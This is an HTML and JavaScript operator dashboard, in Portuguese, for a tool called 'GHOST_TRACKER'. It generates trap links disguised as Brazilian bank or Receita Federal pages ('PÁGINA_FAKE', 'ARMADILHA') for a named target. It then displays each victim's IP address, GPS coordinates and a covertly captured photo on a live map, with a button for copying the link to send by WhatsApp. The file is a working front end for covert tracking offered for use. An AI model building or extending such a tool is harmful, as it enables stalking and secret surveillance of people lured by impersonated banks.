<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>/// GHOST_TRACKER_V5 ///</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --neon-green: #0f0; --neon-cyan: #0ff; --dark-bg: #050505; --panel-bg: rgba(10, 10, 10, 0.9); }
        body { font-family: 'Fira Code', monospace; margin: 0; display: flex; height: 100vh; background-color: var(--dark-bg); color: #ddd; overflow: hidden; background-image: url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2070'); background-size: cover; }
        body::after { content: ""; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px); pointer-events: none; z-index: 9999; }
        #sidebar { width: 400px; background: var(--panel-bg); border-right: 1px solid var(--neon-green); overflow-y: auto; display: flex; flex-direction: column; z-index: 1000; backdrop-filter: blur(5px); }
        #sidebar-header { padding: 25px; background: rgba(0, 20, 0, 0.9); color: var(--neon-green); border-bottom: 1px solid var(--neon-green); text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon-green); }
        #sidebar-content { padding: 20px; }
        #mapa { flex: 1; height: 100%; z-index: 1; background-color: #fff; }
        
        .form-group { margin-bottom: 15px; }
        label { font-size: 10px; color: var(--neon-cyan); margin-bottom: 5px; display: block; text-transform: uppercase; }
        input[type="text"], select { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon-green); font-family: 'Fira Code', monospace; font-size: 12px; box-sizing: border-box; }
        input[type="text"]:focus, select:focus { border-color: var(--neon-green); outline: none; }
        button.btn-primary { background: transparent; color: var(--neon-green); width: 100%; padding: 14px; border: 1px solid var(--neon-green); cursor: pointer; text-transform: uppercase; font-weight: bold; margin-top: 10px; }
        button.btn-primary:hover { background: var(--neon-green); color: #000; box-shadow: 0 0 15px var(--neon-green); }
        
        .telemetry-card { background: rgba(0, 0, 0, 0.6); border: 1px solid #333; border-left: 3px solid var(--neon-cyan); margin-bottom: 20px; }
        .card-header { background: rgba(0, 255, 255, 0.05); padding: 10px 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .motorista-nome { font-weight: bold; color: #fff; font-size: 14px; text-transform: uppercase; }
        .btn-delete { color: #555; background: none; border: none; font-size: 18px; cursor: pointer; }
        .btn-delete:hover { color: #ff0055; }
        
        .card-body { padding: 15px; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 10px; color: #aaa; margin-bottom: 10px; }
        .info-value { color: var(--neon-green); font-size: 11px; margin-top: 2px; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        
        /* CONTAINER DA FOTO */
        .foto-preview { grid-column: span 2; margin-top: 10px; border: 1px solid #333; background: #000; text-align: center; overflow: hidden; border-radius: 4px; }
        .foto-img { width: 100%; height: auto; display: block; border: 1px solid var(--neon-green); }

        .link-display { background: #111; border: 1px solid #333; padding: 8px; font-size: 10px; color: var(--neon-cyan); width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .action-bar { display: flex; gap: 5px; padding: 10px; border-top: 1px solid #333; background: rgba(0,0,0,0.3); }
        .btn-zap { flex: 2; background: #003300; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 10px; cursor: pointer; font-size: 11px; font-weight: bold; font-family: 'Fira Code', monospace; }
        .btn-zap:hover { background: var(--neon-green); color: black; }
        .btn-locate { flex: 1; background: #000; color: #fff; border: 1px solid #555; padding: 10px; cursor: pointer; font-size: 11px; }
        
        .status-dot { height: 8px; width: 8px; background-color: #333; border-radius: 50%; display: inline-block; margin-right: 6px; }
        .online { background-color: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .separator-title { color: #555; font-size: 9px; background: #0a0a0a; padding-right: 10px; position: absolute; top: -8px; left: 0; }
    </style>
</head>
<body>
    <div id="sidebar">
        <div id="sidebar-header"><h2>/// NET_TRACKER</h2><small>SISTEMA: ATIVO</small></div>
        <div id="sidebar-content">
            <form action="/gerar_ordem" method="POST">
                <div class="form-group"><label>> ID_ALVO (Motorista)</label><input type="text" name="motorista" placeholder="Nome..." required></div>
                <div style="margin: 35px 0 25px 0; border-top: 1px dashed #444; position: relative;"><span class="separator-title">// ARMADILHA</span></div>
                <div class="form-group"><label>> NOME_LINK (Opcional)</label><input type="text" name="personalizacao" placeholder="Ex: Boleto-Nubank"></div>
                <div class="form-group"><label>> PÁGINA_FAKE (Disfarce)</label>
                    <select name="redirect">
                        <option value="https://www.google.com">/// Google</option>
                        <option value="https://nubank.com.br">[BANK] Nubank</option>
                        <option value="https://www.bb.com.br">[BANK] Banco do Brasil</option>
                        <option value="https://banco.bradesco">[BANK] Bradesco</option>
                        <option value="https://www.itau.com.br">[BANK] Itaú</option>
                        <option value="https://www.c6bank.com.br">[BANK] C6 Bank</option>
                        <option value="https://inter.co">[BANK] Banco Inter</option>
                        <option value="https://www.gov.br/receitafederal">[GOV] Receita Federal</option>
                    </select>
                </div>
                <button type="submit" class="btn-primary">>> INICIAR</button>
            </form>
            <div style="border-top: 1px solid var(--neon-green); margin: 30px 0;"></div>
            <div id="lista-frota"></div>
        </div>
    </div>
    <div id="mapa"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('mapa').setView([-14.23, -51.92], 4);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var markers = {};
        var primeiraVez = true;

        function copiarZap(link) { navigator.clipboard.writeText(link).then(() => alert(">> LINK COPIADO")); }
        function excluirOrdem(id, nome) { if(confirm(`Excluir alvo: ${nome}?`)) fetch(`/excluir/${id}`, {method:'DELETE'}).then(() => atualizar()); }
        function focar(lat, lon) { map.flyTo([lat, lon], 17); }

        function atualizar() {
            fetch('/api/frota').then(r => r.json()).then(frota => {
                const div = document.getElementById('lista-frota');
                div.innerHTML = "";
                for (const [id, dados] of Object.entries(frota)) {
                    const onlineClass = dados.status.includes("Online") ? "online" : "";
                    const bLoc = dados.lat ? `<button class="btn-locate" onclick="focar(${dados.lat}, ${dados.lon})">[ FOCO ]</button>` : `<button class="btn-locate" style="opacity:0.3">[ AGUARDANDO ]</button>`;
                    
                    const latitudeDisplay = dados.lat ? dados.lat.toFixed(6) : '-';
                    const longitudeDisplay = dados.lon ? dados.lon.toFixed(6) : '-';

                    // Lógica para mostrar a foto ou mensagem de aguardando
                    const fotoHtml = dados.foto ? `<img src="${dados.foto}" class="foto-img">` : `<span style="color:#444; font-size:8px; padding: 20px; display:block;">[ AGUARDANDO CAPTURA VISUAL ]</span>`;

                    div.innerHTML += `
                        <div class="telemetry-card">
                            <div class="card-header"><div><span class="status-dot ${onlineClass}"></span><span class="motorista-nome">${dados.motorista}</span></div><button class="btn-delete" onclick="excluirOrdem('${id}', '${dados.motorista}')">×</button></div>
                            <div class="card-body">
                                <div class="info-grid">
                                    <div><label>VISTO_EM</label><span class="info-value">${dados.ultimo_visto}</span></div>
                                    <div><label>IP</label><span class="info-value">${dados.ip || '-'}</span></div>
                                    <div><label>LATITUDE</label><span class="info-value">${latitudeDisplay}</span></div>
                                    <div><label>LONGITUDE</label><span class="info-value">${longitudeDisplay}</span></div>
                                    <div class="foto-preview">
                                        <label style="color:#555; margin: 5px;">VISUAL_CONFIRMATION</label>
                                        ${fotoHtml}
                                    </div>
                                </div>
                                <input type="text" class="link-display" value="${dados.link}" readonly>
                            </div>
                            <div class="action-bar"><button class="btn-zap" onclick="copiarZap('${dados.link}')">COPIAR LINK</button>${bLoc}</div>
                        </div>`;
                    if(dados.lat) {
                        if(markers[id]) {
                            markers[id].setLatLng([dados.lat, dados.lon]);
                        } else {
                            markers[id] = L.marker([dados.lat, dados.lon]).addTo(map).bindPopup(dados.motorista);
                            if(primeiraVez) { focar(dados.lat, dados.lon); primeiraVez = false; }
                        }
                    }
                }
            });
        }
        setInterval(atualizar, 3000); atualizar();
    </script>
</body>
</html>
